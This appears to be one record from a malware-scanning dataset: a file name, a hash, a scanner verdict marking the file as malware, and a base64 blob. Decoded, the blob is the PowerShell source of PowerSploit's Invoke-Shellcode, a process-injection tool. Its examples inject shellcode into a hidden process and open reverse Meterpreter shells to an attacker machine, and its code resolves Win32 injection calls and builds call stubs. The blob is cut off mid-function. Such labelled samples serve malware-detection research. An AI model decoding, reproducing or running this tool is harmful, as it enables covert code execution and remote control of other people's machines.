6-Process Injection-Shellcode.ps1,81a3e73df47f6a2c033430c52f834ec5,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gSW52b2tlLVNoZWxsY29kZQp7CjwjCi5TWU5PUFNJUwoKSW5qZWN0IHNoZWxsY29kZSBpbnRvIHRoZSBwcm9jZXNzIElEIG9mIHlvdXIgY2hvb3Npbmcgb3Igd2l0aGluIHRoZSBjb250ZXh0IG9mIHRoZSBydW5uaW5nIFBvd2VyU2hlbGwgcHJvY2Vzcy4KClBvd2VyU3Bsb2l0IEZ1bmN0aW9uOiBJbnZva2UtU2hlbGxjb2RlCkF1dGhvcjogTWF0dGhldyBHcmFlYmVyIChAbWF0dGlmZXN0YXRpb24pCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZQpSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IE5vbmUKT3B0aW9uYWwgRGVwZW5kZW5jaWVzOiBOb25lCiAKLkRFU0NSSVBUSU9OCgpQb3J0aW9ucyBvZiB0aGlzIHByb2plY3Qgd2FzIGJhc2VkIHVwb24gc3lyaW5nZS5jIHYxLjIgd3JpdHRlbiBieSBTcGVuY2VyIE1jSW50eXJlCgpQb3dlclNoZWxsIGV4cGVjdHMgc2hlbGxjb2RlIHRvIGJlIGluIHRoZSBmb3JtIDB4WFgsMHhYWCwweFhYLiBUbyBnZW5lcmF0ZSB5b3VyIHNoZWxsY29kZSBpbiB0aGlzIGZvcm0sIHlvdSBjYW4gdXNlIHRoaXMgY29tbWFuZCBmcm9tIHdpdGhpbiBCYWNrdHJhY2sgKFRoYW5rcywgTWF0dCBhbmQgZzB0bTFsayk6Cgptc2ZwYXlsb2FkIHdpbmRvd3MvZXhlYyBDTUQ9ImNtZCAvayBjYWxjIiBFWElURlVOQz10aHJlYWQgQyB8IHNlZCAnMSw2ZDtzL1siO10vL2c7cy9cXC8sMC9nJyB8IHRyIC1kICdcbicgfCBjdXQgLWMyLSAKCk1ha2Ugc3VyZSB0byBzcGVjaWZ5ICd0aHJlYWQnIGZvciB5b3VyIGV4aXQgcHJvY2Vzcy4gQWxzbywgZG9uJ3QgYm90aGVyIGVuY29kaW5nIHlvdXIgc2hlbGxjb2RlLiBJdCdzIGVudGlyZWx5IHVubmVjZXNzYXJ5LgogCi5QQVJBTUVURVIgUHJvY2Vzc0lECgpQcm9jZXNzIElEIG9mIHRoZSBwcm9jZXNzIHlvdSB3YW50IHRvIGluamVjdCBzaGVsbGNvZGUgaW50by4KCi5QQVJBTUVURVIgU2hlbGxjb2RlCgpTcGVjaWZpZXMgYW4gb3B0aW9uYWwgc2hlbGxjb2RlIHBhc3NlZCBpbiBhcyBhIGJ5dGUgYXJyYXkKCi5QQVJBTUVURVIgTGlzdE1ldGFzcGxvaXRQYXlsb2FkcwoKTGlzdHMgYWxsIG9mIHRoZSBhdmFpbGFibGUgTWV0YXNwbG9pdCBwYXlsb2FkcyB0aGF0IEludm9rZS1TaGVsbGNvZGUgc3VwcG9ydHMKCi5QQVJBTUVURVIgTGhvc3QKClNwZWNpZmllcyB0aGUgSVAgYWRkcmVzcyBvZiB0aGUgYXR0YWNrIG1hY2hpbmUgd2FpdGluZyB0byByZWNlaXZlIHRoZSByZXZlcnNlIHNoZWxsCgouUEFSQU1FVEVSIExwb3J0CiAKU3BlY2lmaWVzIHRoZSBwb3J0IG9mIHRoZSBhdHRhY2sgbWFjaGluZSB3YWl0aW5nIHRvIHJlY2VpdmUgdGhlIHJldmVyc2Ugc2hlbGwKCi5QQVJBTUVURVIgUGF5bG9hZAoKU3BlY2lmaWVzIHRoZSBtZXRhc3Bsb2l0IHBheWxvYWQgdG8gdXNlLiBDdXJyZW50bHksIG9ubHkgJ3dpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwJyBhbmQgJ3dpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwcycgcGF5bG9hZHMgYXJlIHN1cHBvcnRlZC4KCi5QQVJBTUVURVIgVXNlckFnZW50CgpPcHRpb25hbGx5IHNwZWNpZmllcyB0aGUgdXNlciBhZ2VudCB0byB1c2Ugd2hlbiB1c2luZyBtZXRlcnByZXRlciBodHRwIG9yIGh0dHBzIHBheWxvYWRzCgouUEFSQU1FVEVSIFByb3h5CgpPcHRpb25hbGx5IHNwZWNpZmllcyB3aGV0aGVyIHRvIHV0aWxpemUgdGhlIHByb3h5IHNldHRpbmdzIG9uIHRoZSBtYWNoaW5lLgoKLlBBUkFNRVRFUiBMZWdhY3kKCk9wdGlvbmFsbHkgc3BlY2lmaWVzIHdoZXRoZXIgdG8gdXRpbGl6ZSB0aGUgb2xkZXIgbWV0ZXJwcmV0ZXIgaGFuZGxlciAiSU5JVE0iLiBUaGlzIHdpbGwgbGlrZWx5IGJlIHJlbW92ZWQgaW4gdGhlIGZ1dHVyZS4gCgouUEFSQU1FVEVSIEZvcmNlCgpJbmplY3RzIHNoZWxsY29kZSB3aXRob3V0IHByb21wdGluZyBmb3IgY29uZmlybWF0aW9uLiBCeSBkZWZhdWx0LCBJbnZva2UtU2hlbGxjb2RlIHByb21wdHMgZm9yIGNvbmZpcm1hdGlvbiBiZWZvcmUgcGVyZm9ybWluZyBhbnkgbWFsaWNpb3VzIGFjdC4KCi5FWEFNUExFCgpDOlxQUz4gSW52b2tlLVNoZWxsY29kZSAtUHJvY2Vzc0lkIDQyNzQKCkRlc2NyaXB0aW9uCi0tLS0tLS0tLS0tCkluamVjdCBzaGVsbGNvZGUgaW50byBwcm9jZXNzIElEIDQyNzQuCgouRVhBTVBMRQoKQzpcUFM+IEludm9rZS1TaGVsbGNvZGUKCkRlc2NyaXB0aW9uCi0tLS0tLS0tLS0tCkluamVjdCBzaGVsbGNvZGUgaW50byB0aGUgcnVubmluZyBpbnN0YW5jZSBvZiBQb3dlclNoZWxsLgoKLkVYQU1QTEUKCkM6XFBTPiBTdGFydC1Qcm9jZXNzIEM6XFdpbmRvd3NcU3lzV09XNjRcbm90ZXBhZC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbgpDOlxQUz4gJFByb2MgPSBHZXQtUHJvY2VzcyBub3RlcGFkCkM6XFBTPiBJbnZva2UtU2hlbGxjb2RlIC1Qcm9jZXNzSWQgJFByb2MuSWQgLVBheWxvYWQgd2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHBzIC1MaG9zdCAxOTIuMTY4LjMwLjEyOSAtTHBvcnQgNDQzIC1WZXJib3NlCgpWRVJCT1NFOiBSZXF1ZXN0aW5nIG1ldGVycHJldGVyIHBheWxvYWQgZnJvbSBodHRwczovLzE5Mi4xNjguMzAuMTI5OjQ0My9JTklUTQpWRVJCT1NFOiBJbmplY3Rpbmcgc2hlbGxjb2RlIGludG8gUElEOiA0MDA0ClZFUkJPU0U6IEluamVjdGluZyBpbnRvIGEgV293NjQgcHJvY2Vzcy4KVkVSQk9TRTogVXNpbmcgMzItYml0IHNoZWxsY29kZS4KVkVSQk9TRTogU2hlbGxjb2RlIG1lbW9yeSByZXNlcnZlZCBhdCAweDAzQkUwMDAwClZFUkJPU0U6IEVtaXR0aW5nIDMyLWJpdCBhc3NlbWJseSBjYWxsIHN0dWIuClZFUkJPU0U6IFRocmVhZCBjYWxsIHN0dWIgbWVtb3J5IHJlc2VydmVkIGF0IDB4MDAxQjAwMDAKVkVSQk9TRTogU2hlbGxjb2RlIGluamVjdGlvbiBjb21wbGV0ZSEKCkRlc2NyaXB0aW9uCi0tLS0tLS0tLS0tCkVzdGFibGlzaGVzIGEgcmV2ZXJzZSBodHRwcyBtZXRlcnByZXRlciBwYXlsb2FkIGZyb20gd2l0aGluIHRoZSBoaWRkZW4gbm90ZXBhZCBwcm9jZXNzLiBBIG11bHRpLWhhbmRsZXIgd2FzIHNldCB1cCB3aXRoIHRoZSBmb2xsb3dpbmcgb3B0aW9uczoKClBheWxvYWQgb3B0aW9ucyAod2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHBzKToKCk5hbWUgICAgICBDdXJyZW50IFNldHRpbmcgIFJlcXVpcmVkICBEZXNjcmlwdGlvbgotLS0tICAgICAgLS0tLS0tLS0tLS0tLS0tICAtLS0tLS0tLSAgLS0tLS0tLS0tLS0KRVhJVEZVTkMgIHRocmVhZCAgICAgICAgICAgeWVzICAgICAgIEV4aXQgdGVjaG5pcXVlOiBzZWgsIHRocmVhZCwgcHJvY2Vzcywgbm9uZQpMSE9TVCAgICAgMTkyLjE2OC4zMC4xMjkgICB5ZXMgICAgICAgVGhlIGxvY2FsIGxpc3RlbmVyIGhvc3RuYW1lCkxQT1JUICAgICA0NDMgICAgICAgICAgICAgIHllcyAgICAgICBUaGUgbG9jYWwgbGlzdGVuZXIgcG9ydAoKLkVYQU1QTEUKCkM6XFBTPiBJbnZva2UtU2hlbGxjb2RlIC1QYXlsb2FkIHdpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwcyAtTGhvc3QgMTkyLjE2OC4zMC4xMjkgLUxwb3J0IDgwCgpEZXNjcmlwdGlvbgotLS0tLS0tLS0tLQpFc3RhYmxpc2hlcyBhIHJldmVyc2UgaHR0cCBtZXRlcnByZXRlciBwYXlsb2FkIGZyb20gd2l0aGluIHRoZSBydW5uaW5nIFB3ZXJTaGVsbCBwcm9jZXNzLiBBIG11bHRpLWhhbmRsZXIgd2FzIHNldCB1cCB3aXRoIHRoZSBmb2xsb3dpbmcgb3B0aW9uczoKClBheWxvYWQgb3B0aW9ucyAod2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHApOgoKTmFtZSAgICAgIEN1cnJlbnQgU2V0dGluZyAgUmVxdWlyZWQgIERlc2NyaXB0aW9uCi0tLS0gICAgICAtLS0tLS0tLS0tLS0tLS0gIC0tLS0tLS0tICAtLS0tLS0tLS0tLQpFWElURlVOQyAgdGhyZWFkICAgICAgICAgICB5ZXMgICAgICAgRXhpdCB0ZWNobmlxdWU6IHNlaCwgdGhyZWFkLCBwcm9jZXNzLCBub25lCkxIT1NUICAgICAxOTIuMTY4LjMwLjEyOSAgIHllcyAgICAgICBUaGUgbG9jYWwgbGlzdGVuZXIgaG9zdG5hbWUKTFBPUlQgICAgIDgwICAgICAgICAgICAgICAgeWVzICAgICAgIFRoZSBsb2NhbCBsaXN0ZW5lciBwb3J0CgouRVhBTVBMRQoKQzpcUFM+IEludm9rZS1TaGVsbGNvZGUgLVNoZWxsY29kZSBAKDB4OTAsMHg5MCwweEMzKQogICAgCkRlc2NyaXB0aW9uCi0tLS0tLS0tLS0tCk92ZXJyaWRlcyB0aGUgc2hlbGxjb2RlIGluY2x1ZGVkIGluIHRoZSBzY3JpcHQgd2l0aCBjdXN0b20gc2hlbGxjb2RlIC0gMHg5MCAoTk9QKSwgMHg5MCAoTk9QKSwgMHhDMyAoUkVUKQpXYXJuaW5nOiBUaGlzIHNjcmlwdCBoYXMgbm8gd2F5IHRvIHZhbGlkYXRlIHRoYXQgeW91ciBzaGVsbGNvZGUgaXMgMzIgdnMuIDY0LWJpdCEKICAgIAouRVhBTVBMRQoKQzpcUFM+IEludm9rZS1TaGVsbGNvZGUgLUxpc3RNZXRhc3Bsb2l0UGF5bG9hZHMKICAgIApQYXlsb2FkcwotLS0tLS0tLQp3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cAp3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cHMKCi5OT1RFUwoKVXNlIHRoZSAnLVZlcmJvc2UnIG9wdGlvbiB0byBwcmludCBkZXRhaWxlZCBpbmZvcm1hdGlvbi4KClBsYWNlIHlvdXIgZ2VuZXJhdGVkIHNoZWxsY29kZSBpbiAkU2hlbGxjb2RlMzIgYW5kICRTaGVsbGNvZGU2NCB2YXJpYWJsZXMgb3IgcGFzcyBpdCBpbiBhcyBhIGJ5dGUgYXJyYXkgdmlhIHRoZSAnLVNoZWxsY29kZScgcGFyYW1ldGVyCgpCaWcgdGhhbmtzIHRvIE9pc2luICh4MG4pIEdyZWhhbiAoQG9pc2luZykgZm9yIGFuc3dlcmluZyBhbGwgbXkgb2JzY3VyZSBxdWVzdGlvbnMgYXQgdGhlIGRyb3Agb2YgYSBoYXQgLSBodHRwOi8vd3d3Lm5pdm90Lm9yZy8KCi5MSU5LCgpodHRwOi8vd3d3LmV4cGxvaXQtbW9uZGF5LmNvbQojPgoKW0NtZGxldEJpbmRpbmcoIERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lID0gJ1J1bkxvY2FsJywgU3VwcG9ydHNTaG91bGRQcm9jZXNzID0gJFRydWUgLCBDb25maXJtSW1wYWN0ID0gJ0hpZ2gnKV0gUGFyYW0gKAogICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgIFtVSW50MTZdCiAgICAkUHJvY2Vzc0lELAogICAgCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ1J1bkxvY2FsJyApXQogICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgIFtCeXRlW11dCiAgICAkU2hlbGxjb2RlLAogICAgCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ01ldGFzcGxvaXQnICldCiAgICBbVmFsaWRhdGVTZXQoICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cCcsCiAgICAgICAgICAgICAgICAgICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cHMnLAogICAgICAgICAgICAgICAgICBJZ25vcmVDYXNlID0gJFRydWUgKV0KICAgIFtTdHJpbmddCiAgICAkUGF5bG9hZCA9ICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cCcsCiAgICAKICAgIFtQYXJhbWV0ZXIoIFBhcmFtZXRlclNldE5hbWUgPSAnTGlzdFBheWxvYWRzJyApXQogICAgW1N3aXRjaF0KICAgICRMaXN0TWV0YXNwbG9pdFBheWxvYWRzLAogICAgCiAgICBbUGFyYW1ldGVyKCBNYW5kYXRvcnkgPSAkVHJ1ZSwKICAgICAgICAgICAgICAgIFBhcmFtZXRlclNldE5hbWUgPSAnTWV0YXNwbG9pdCcgKV0KICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICBbU3RyaW5nXQogICAgJExob3N0ID0gJzEyNy4wLjAuMScsCiAgICAKICAgIFtQYXJhbWV0ZXIoIE1hbmRhdG9yeSA9ICRUcnVlLAogICAgICAgICAgICAgICAgUGFyYW1ldGVyU2V0TmFtZSA9ICdNZXRhc3Bsb2l0JyApXQogICAgW1ZhbGlkYXRlUmFuZ2UoIDEsNjU1MzUgKV0KICAgIFtJbnRdCiAgICAkTHBvcnQgPSA4NDQzLAogICAgCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ01ldGFzcGxvaXQnICldCiAgICBbVmFsaWRhdGVOb3ROdWxsKCldCiAgICBbU3RyaW5nXQogICAgJFVzZXJBZ2VudCA9IChHZXQtSXRlbVByb3BlcnR5IC1QYXRoICdIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxJbnRlcm5ldCBTZXR0aW5ncycpLidVc2VyIEFnZW50JywKCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ01ldGFzcGxvaXQnICldCiAgICBbVmFsaWRhdGVOb3ROdWxsKCldCiAgICBbU3dpdGNoXQogICAgJExlZ2FjeSA9ICRGYWxzZSwKCiAgICBbUGFyYW1ldGVyKCBQYXJhbWV0ZXJTZXROYW1lID0gJ01ldGFzcGxvaXQnICldCiAgICBbVmFsaWRhdGVOb3ROdWxsKCldCiAgICBbU3dpdGNoXQogICAgJFByb3h5ID0gJEZhbHNlLAogICAgCiAgICBbU3dpdGNoXQogICAgJEZvcmNlID0gJEZhbHNlCikKCiAgICBTZXQtU3RyaWN0TW9kZSAtVmVyc2lvbiAyLjAKICAgIAogICAgIyBMaXN0IGFsbCBhdmFpbGFibGUgTWV0YXNwbG9pdCBwYXlsb2FkcyBhbmQgZXhpdCB0aGUgZnVuY3Rpb24KICAgIGlmICgkUHNDbWRsZXQuUGFyYW1ldGVyU2V0TmFtZSAtZXEgJ0xpc3RQYXlsb2FkcycpCiAgICB7CiAgICAgICAgJEF2YWlsYWJsZVBheWxvYWRzID0gKEdldC1Db21tYW5kIEludm9rZS1TaGVsbGNvZGUpLlBhcmFtZXRlcnNbJ1BheWxvYWQnXS5BdHRyaWJ1dGVzIHwKICAgICAgICAgICAgV2hlcmUtT2JqZWN0IHskXy5UeXBlSWQgLWVxIFtTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlZhbGlkYXRlU2V0QXR0cmlidXRlXX0KICAgIAogICAgICAgIGZvcmVhY2ggKCRQYXlsb2FkIGluICRBdmFpbGFibGVQYXlsb2Fkcy5WYWxpZFZhbHVlcykKICAgICAgICB7CiAgICAgICAgICAgIE5ldy1PYmplY3QgUFNPYmplY3QgLVByb3BlcnR5IEB7IFBheWxvYWRzID0gJFBheWxvYWQgfQogICAgICAgIH0KICAgICAgICAKICAgICAgICBSZXR1cm4KICAgIH0KCiAgICBpZiAoICRQU0JvdW5kUGFyYW1ldGVyc1snUHJvY2Vzc0lEJ10gKQogICAgewogICAgICAgICMgRW5zdXJlIGEgdmFsaWQgcHJvY2VzcyBJRCB3YXMgcHJvdmlkZWQKICAgICAgICAjIFRoaXMgY291bGQgaGF2ZSBiZWVuIHZhbGlkYXRlZCB2aWEgJ1ZhbGlkYXRlU2NyaXB0JyBidXQgdGhlIGVycm9yIGdlbmVyYXRlZCB3aXRoIEdldC1Qcm9jZXNzIGlzIG1vcmUgZGVzY3JpcHRpdmUKICAgICAgICBHZXQtUHJvY2VzcyAtSWQgJFByb2Nlc3NJRCAtRXJyb3JBY3Rpb24gU3RvcCB8IE91dC1OdWxsCiAgICB9CiAgICAKICAgIGZ1bmN0aW9uIExvY2FsOkdldC1EZWxlZ2F0ZVR5cGUKICAgIHsKICAgICAgICBQYXJhbQogICAgICAgICgKICAgICAgICAgICAgW091dHB1dFR5cGUoW1R5cGVdKV0KICAgICAgICAgICAgCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCldCiAgICAgICAgICAgIFtUeXBlW11dCiAgICAgICAgICAgICRQYXJhbWV0ZXJzID0gKE5ldy1PYmplY3QgVHlwZVtdKDApKSwKICAgICAgICAgICAgCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMSApXQogICAgICAgICAgICBbVHlwZV0KICAgICAgICAgICAgJFJldHVyblR5cGUgPSBbVm9pZF0KICAgICAgICApCgogICAgICAgICREb21haW4gPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbgogICAgICAgICREeW5Bc3NlbWJseSA9IE5ldy1PYmplY3QgU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHlOYW1lKCdSZWZsZWN0ZWREZWxlZ2F0ZScpCiAgICAgICAgJEFzc2VtYmx5QnVpbGRlciA9ICREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KCREeW5Bc3NlbWJseSwgW1N5c3RlbS5SZWZsZWN0aW9uLkVtaXQuQXNzZW1ibHlCdWlsZGVyQWNjZXNzXTo6UnVuKQogICAgICAgICRNb2R1bGVCdWlsZGVyID0gJEFzc2VtYmx5QnVpbGRlci5EZWZpbmVEeW5hbWljTW9kdWxlKCdJbk1lbW9yeU1vZHVsZScsICRmYWxzZSkKICAgICAgICAkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdNeURlbGVnYXRlVHlwZScsICdDbGFzcywgUHVibGljLCBTZWFsZWQsIEFuc2lDbGFzcywgQXV0b0NsYXNzJywgW1N5c3RlbS5NdWx0aWNhc3REZWxlZ2F0ZV0pCiAgICAgICAgJENvbnN0cnVjdG9yQnVpbGRlciA9ICRUeXBlQnVpbGRlci5EZWZpbmVDb25zdHJ1Y3RvcignUlRTcGVjaWFsTmFtZSwgSGlkZUJ5U2lnLCBQdWJsaWMnLCBbU3lzdGVtLlJlZmxlY3Rpb24uQ2FsbGluZ0NvbnZlbnRpb25zXTo6U3RhbmRhcmQsICRQYXJhbWV0ZXJzKQogICAgICAgICRDb25zdHJ1Y3RvckJ1aWxkZXIuU2V0SW1wbGVtZW50YXRpb25GbGFncygnUnVudGltZSwgTWFuYWdlZCcpCiAgICAgICAgJE1ldGhvZEJ1aWxkZXIgPSAkVHlwZUJ1aWxkZXIuRGVmaW5lTWV0aG9kKCdJbnZva2UnLCAnUHVibGljLCBIaWRlQnlTaWcsIE5ld1Nsb3QsIFZpcnR1YWwnLCAkUmV0dXJuVHlwZSwgJFBhcmFtZXRlcnMpCiAgICAgICAgJE1ldGhvZEJ1aWxkZXIuU2V0SW1wbGVtZW50YXRpb25GbGFncygnUnVudGltZSwgTWFuYWdlZCcpCiAgICAgICAgCiAgICAgICAgV3JpdGUtT3V0cHV0ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKICAgIH0KCiAgICBmdW5jdGlvbiBMb2NhbDpHZXQtUHJvY0FkZHJlc3MKICAgIHsKICAgICAgICBQYXJhbQogICAgICAgICgKICAgICAgICAgICAgW091dHB1dFR5cGUoW0ludFB0cl0pXQogICAgICAgIAogICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlICldCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICRNb2R1bGUsCiAgICAgICAgICAgIAogICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICRUcnVlICldCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICRQcm9jZWR1cmUKICAgICAgICApCgogICAgICAgICMgR2V0IGEgcmVmZXJlbmNlIHRvIFN5c3RlbS5kbGwgaW4gdGhlIEdBQwogICAgICAgICRTeXN0ZW1Bc3NlbWJseSA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfQogICAgICAgICRVbnNhZmVOYXRpdmVNZXRob2RzID0gJFN5c3RlbUFzc2VtYmx5LkdldFR5cGUoJ01pY3Jvc29mdC5XaW4zMi5VbnNhZmVOYXRpdmVNZXRob2RzJykKICAgICAgICAjIEdldCBhIHJlZmVyZW5jZSB0byB0aGUgR2V0TW9kdWxlSGFuZGxlIGFuZCBHZXRQcm9jQWRkcmVzcyBtZXRob2RzCiAgICAgICAgJEdldE1vZHVsZUhhbmRsZSA9ICRVbnNhZmVOYXRpdmVNZXRob2RzLkdldE1ldGhvZCgnR2V0TW9kdWxlSGFuZGxlJykKICAgICAgICAkR2V0UHJvY0FkZHJlc3MgPSAkVW5zYWZlTmF0aXZlTWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJykKICAgICAgICAjIEdldCBhIGhhbmRsZSB0byB0aGUgbW9kdWxlIHNwZWNpZmllZAogICAgICAgICRLZXJuMzJIYW5kbGUgPSAkR2V0TW9kdWxlSGFuZGxlLkludm9rZSgkbnVsbCwgQCgkTW9kdWxlKSkKICAgICAgICAkdG1wUHRyID0gTmV3LU9iamVjdCBJbnRQdHIKICAgICAgICAkSGFuZGxlUmVmID0gTmV3LU9iamVjdCBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuSGFuZGxlUmVmKCR0bXBQdHIsICRLZXJuMzJIYW5kbGUpCiAgICAgICAgCiAgICAgICAgIyBSZXR1cm4gdGhlIGFkZHJlc3Mgb2YgdGhlIGZ1bmN0aW9uCiAgICAgICAgV3JpdGUtT3V0cHV0ICRHZXRQcm9jQWRkcmVzcy5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdJEhhbmRsZVJlZiwgJFByb2NlZHVyZSkpCiAgICB9CgogICAgIyBFbWl0cyBhIHNoZWxsY29kZSBzdHViIHRoYXQgd2hlbiBpbmplY3RlZCB3aWxsIGNyZWF0ZSBhIHRocmVhZCBhbmQgcGFzcyBleGVjdXRpb24gdG8gdGhlIG1haW4gc2hlbGxjb2RlIHBheWxvYWQKICAgIGZ1bmN0aW9uIExvY2FsOkVtaXQtQ2FsbFRocmVhZFN0dWIgKFtJbnRQdHJdICRCYXNlQWRkciwgW0ludFB0cl0gJEV4aXRUaHJlYWRBZGRyLCBbSW50XSAkQXJjaGl0ZWN0dXJlKQogICAgewogICAgICAgICRJbnRTaXplUHRyID0gJEFyY2hpdGVjdHVyZSAvIDgKCiAgICAgICAgZnVuY3Rpb24gTG9jYWw6Q29udmVydFRvLUxpdHRsZUVuZGlhbiAoW0ludFB0cl0gJEFkZHJlc3MpCiAgICAgICAgewogICAgICAgICAgICAkTGl0dGxlRW5kaWFuQnl0ZUFycmF5ID0gTmV3LU9iamVjdCBCeXRlW10oMCkKICAgICAgICAgICAgJEFkZHJlc3MuVG9TdHJpbmcoIlgkKCRJbnRTaXplUHRyKjIpIikgLXNwbGl0ICcoW0EtRjAtOV17Mn0pJyB8IEZvckVhY2gtT2JqZWN0IHsgaWYgKCRfKSB7ICRMaXR0bGVFbmRpYW5CeXRlQXJyYXkgKz0gW0J5dGVdICgnMHh7MH0nIC1mICRfKSB9IH0KICAgICAgICAgICAgW1N5c3RlbS5BcnJheV06OlJldmVyc2UoJExpdHRsZUVuZGlhbkJ5dGVBcnJheSkKICAgICAgICAgICAgCiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAkTGl0dGxlRW5kaWFuQnl0ZUFycmF5CiAgICAgICAgfQogICAgICAgIAogICAgICAgICRDYWxsU3R1YiA9IE5ldy1PYmplY3QgQnl0ZVtdKDApCiAgICAgICAgCiAgICAgICAgaWYgKCRJbnRTaXplUHRyIC1lcSA4KQogICAgICAgIHsKICAgICAgICAgICAgW0J5dGVbXV0gJENhbGxTdHViID0gMHg0OCwweEI4ICAgICAgICAgICAgICAgICAgICAgICMgTU9WICAgUVdPUkQgUkFYLCAmc2hlbGxjb2RlCiAgICAgICAgICAgICRDYWxsU3R1YiArPSBDb252ZXJ0VG8tTGl0dGxlRW5kaWFuICRCYXNlQWRkciAgICAgICAjICZzaGVsbGNvZGUKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4RkYsMHhEMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgQ0FMTCAgUkFYCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweDZBLDB4MDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIFBVU0ggIEJZVEUgMAogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHg0OCwweEI4ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBNT1YgICBRV09SRCBSQVgsICZFeGl0VGhyZWFkCiAgICAgICAgICAgICRDYWxsU3R1YiArPSBDb252ZXJ0VG8tTGl0dGxlRW5kaWFuICRFeGl0VGhyZWFkQWRkciAjICZFeGl0VGhyZWFkCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweEZGLDB4RDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIENBTEwgIFJBWAogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBbQnl0ZVtdXSAkQ2FsbFN0dWIgPSAweEI4ICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBNT1YgICBEV09SRCBFQVgsICZzaGVsbGNvZGUKICAgICAgICAgICAgJENhbGxTdHViICs9IENvbnZlcnRUby1MaXR0bGVFbmRpYW4gJEJhc2VBZGRyICAgICAgICMgJnNoZWxsY29kZQogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHhGRiwweEQwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBDQUxMICBFQVgKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4NkEsMHgwMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgUFVTSCAgQllURSAwCiAgICAgICAgICAgICRDYWxsU3R1YiArPSAweEI4ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIE1PViAgIERXT1JEIEVBWCwgJkV4aXRUaHJlYWQKICAgICAgICAgICAgJENhbGxTdHViICs9IENvbnZlcnRUby1MaXR0bGVFbmRpYW4gJEV4aXRUaHJlYWRBZGRyICMgJkV4aXRUaHJlYWQKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4RkYsMHhEMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgQ0FMTCAgRUFYCiAgICAgICAgfQogICAgICAgIAogICAgICAgIFdyaXRlLU91dHB1dCAkQ2FsbFN0dWIKICAgIH0KCiAgICBmdW5jdGlvbiBMb2NhbDpJbmplY3QtUmVtb3RlU2hlbGxjb2RlIChbSW50XSAkUHJvY2Vzc0lEKQogICAgewogICAgICAgICMgT3BlbiBhIGhhbmRsZSB0byB0aGUgcHJvY2VzcyB5b3Ugd2FudCB0byBpbmplY3QgaW50bwogICAgICAgICRoUHJvY2VzcyA9ICRPcGVuUHJvY2Vzcy5JbnZva2UoMHgwMDFGMEZGRiwgJGZhbHNlLCAkUHJvY2Vzc0lEKSAjI